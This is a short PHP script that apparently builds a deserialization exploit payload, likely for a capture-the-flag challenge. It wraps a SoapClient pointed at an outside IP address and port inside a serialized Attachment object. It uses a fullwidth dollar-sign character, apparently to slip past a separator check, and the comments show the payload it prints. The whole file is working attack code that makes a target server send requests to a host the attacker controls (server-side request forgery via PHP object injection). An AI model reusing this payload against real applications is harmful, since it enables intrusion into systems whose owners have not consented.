<?php
class Attachment {
    private $za = NULL;
    public function __construct() {
            $this->za = new SoapClient(null,array('location'=>'http://67.230.186.92:8012','uri'=>'http://67.230.186.92:8012'));   
    }
}
$c=new Attachment();
$aaa="\$serializedobject\xef\xBC\x84".serialize($c);
echo $aaa;
#$serializedobject＄O:10:"Attachment":1:{s:14:"%00Attachment%00za";O:10:"SoapClient":4:{s:3:"uri";s:25:"http://67.230.186.92:8012";s:8:"location";s:25:"http://67.230.186.92:8012";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}}
/*$bbb = '$serializedobject$O:10:"Attachment":1:{s:14: Attachment za";O:10:"SoapClient":4:{s:3:"uri";s:25:"http://67.230.186.92:8012";s:8:"location";s:25:"http://67.230.186.92:8012";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}}';
var_dump(unserialize($bbb));*/